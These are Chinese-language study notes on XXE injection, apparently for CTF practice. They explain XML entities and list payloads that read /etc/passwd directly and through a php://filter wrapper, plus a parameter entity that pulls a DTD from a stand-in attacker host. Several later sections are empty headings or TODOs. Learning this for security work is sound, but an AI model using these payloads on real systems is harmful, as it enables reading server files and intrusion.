# XML外部实体注入漏洞

XML 外部实体注入（XXE）是一种发生在应用程序解析 XML 输入时的安全漏洞。当 XML 解析器配置不当，处理包含对外部实体引用的 XML 输入时，可能导致敏感信息泄露、拒绝服务、服务器端请求伪造、端口扫描等多种攻击。

![https://cdn.acunetix.com/wp-content/uploads/2017/07/11110336/image1.png](https://cdn.acunetix.com/wp-content/uploads/2017/07/11110336/image1.png)

- 读取本地文件
- 内网主机探测
- 内网主机端口扫描
带内实体注入攻击
- XML 解析后，有结果回显
- 基于错误
带外实体注入攻击

## XML语法

XML（E**x**tensible **M**arkup **L**anguage，可扩展标记语言）是一种用于表示结构化数据的标记语言。一个有效的 XML 文档通常包含以下几个基本部分：

- **XML 声明（declaration）**：可选，通常放在文档的第一行，声明版本和编码方式。
  - `<?xml version="1.0" encoding="UTF-8"?>`
- **文档类型定义（Document Type Definition，DTD）**：可选，预定义 XML 文件中的元素、属性及其关系，类似于模板。
- **根元素**：XML 文档必须**有且只有一个根元素**，所有其他元素都包含在这个根元素内。
  - 元素标签，所有的元素由起始标签和结束标签组成。起始标签格式为 `<tagname>`，结束标签格式为 `</tagname>`。标签名称区分大小写。
  - 自闭合元素，没有结束标签，使用自闭合标签，`<example />`。
  - 属性，元素具有属性，用于提供更多信息。属性在起始标签中定义，格式为 `name="value"`。

### 实体

实体（Entity）用于表示在文档中重用的信息，实体类型有：
  
- 内部实体，在文档内部定义。

```xml
<!DOCTYPE example [
    <!ENTITY greeting "Hello, World!">
]>
<example>
    <message>&greeting;</message>
</example>
```

- 外部实体
  - 从外部文件或 URL 引入。
  - 声明方式：`<!ENTITY 实体名称 SYSTEM "URI/URL">`。
  - 引用方式：`&实体名称;`。

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>
```

另一种引用方式

`<!DOCTYPE 根元素名称 PUBLIC "DTD标识名" "公用DTD的URI">`

- 参数实体
  - 参数实体通常用于 DTD 中，以在 DTD 结构内重用文本。在 DTD 中定义，只能在 DTD 中引用。
  - 声明方式：`<!ENTITY % 实体名称 "实体的值">`
  - 引用方式：`%实体名称;`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
<!ENTITY % myparameterentity "my parameter entity value" >
<!ENTITY % xxe SYSTEM "http://web-attacker.com"> 
%myparameterentity;%xxe; ]>
```

> 通常在Blind XXE中使用

## XXE漏洞利用

### 读文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```

例题：BUU XXE COURSE 1

### 内网主机探测

[NCTF2019]True XML cookbook

### 绕过方法

- 修改编码

<!--
TODO:
docx文档的XXE，https://xz.aliyun.com/t/11203

-->

## blind XXE

### out-of-band

### Error-based XXE

<!-- 在 libxml 2.9.0 版本之后，默认禁用了外部实体解析，这在很大程度上缓解了 XXE 漏洞。 -->
<!-- https://github.com/peri0d/BUUOJwp/blob/main/xxe/bsidescf-2019-svgmagic.md -->
## 参考资料

- <https://tttang.com/archive/1716/>
- <https://swarm.ptsecurity.com/impossible-xxe-in-php/>
